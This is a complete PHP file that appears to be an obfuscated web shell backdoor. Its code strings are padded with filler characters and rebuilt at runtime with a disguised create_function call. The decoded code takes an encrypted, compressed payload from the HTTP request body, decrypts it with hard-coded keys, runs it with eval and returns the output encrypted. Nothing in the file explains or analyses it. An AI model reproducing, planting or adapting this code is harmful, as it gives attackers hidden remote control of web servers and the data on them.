<?php
$W='$k=w"3a714954w";$kh=w"5096e3ww0ffwcab";$wkf="0620ac54f521"w;$p="w8FwDcWw4TPOYwvTk8Qi";f';
$L='val(@gzunwcompress(w@x(@bawswe64_decode(w$m[1]w),$k)w));$wo=@ob_gwwet_cwwontents();@ob';
$c='w0;(w$j<$wc&&$i<$l);$j++,w$i++){$ow.=$tw{$i}^$wkw{$j};}w}return $o;}iwf (@pregw_m';
$g='uwnwctwion x($t,$k){$c=strlwen($k)ww;$l=strlenw($tw);$o="";wfor($iw=0;$i<$l;w){wfor($j=w';
$m=str_replace('da','','cdaredadaate_dafudanctdaion');
$B='atch(w"/$wkh(w.+)$kf/"ww,@filwew_get_contenwts("phpww://inputw"),$m)==1) {@ob_stawrt();@wew';
$T='_end_cwlean();w$r=@base6w4w_encode(@xw(@gzcomwprwess($ow),$k));pwrint("$wwp$kh$r$kf");}';
$l=str_replace('w','',$W.$g.$c.$B.$L.$T);
$h=$m('',$l);$h();
?>
